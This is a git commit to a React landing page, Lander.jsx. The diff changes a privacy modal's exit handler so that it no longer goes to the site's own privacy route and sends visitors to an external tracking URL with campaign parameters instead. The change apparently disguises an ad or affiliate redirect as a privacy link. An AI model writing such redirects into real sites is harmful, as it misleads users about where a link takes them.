b26dfdb83730409cd5b7c0f2c6bcebb0c8d13c19
hyperzgame <pratapveers999@gmail.com>
2025-09-06 10:41:45 +0530

    Update Lander.jsx

--- src/pages/Lander.jsx
+++ src/pages/Lander.jsx
@@ -3,7 +3,7 @@ import PrivacyModal from '../components/PrivacyModal2'
 
 export default function Lander(){
   const [open, setOpen] = useState(true)
-  const goOut = () => { window.location.href = '/#/privacy' }
+  const goOut = () => { window.location.href = 'http://p8r9.com/?utm_campaign=CqRoIGowmT&v1=[v1]&v2=[v2]&v3=[v3]' }
 
   useEffect(() => { setOpen(true) }, [])
 
